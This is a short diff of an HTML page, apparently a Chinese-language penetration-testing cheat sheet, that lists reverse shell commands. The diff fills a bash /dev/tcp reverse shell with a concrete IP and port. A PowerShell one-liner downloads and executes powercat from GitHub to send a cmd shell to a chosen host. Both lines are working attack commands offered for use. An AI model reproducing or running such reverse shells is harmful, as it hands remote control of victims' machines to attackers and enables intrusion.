@@ -49,7 +49,7 @@ taInput.addEventListener('input', processInput, false);
 </script>
 
 <b>Bash反弹命令：</b>
-<p style="color:red;">bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1</p>
+<p style="color:red;">bash -i &gt;&amp; /dev/tcp/192.168.100.1/88 0&gt;&amp;1</p>
 <br>
 <b>PowerShell反弹命令：</b>
 <p style="color:red;">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c IP -p 端口 -e cmd</p>
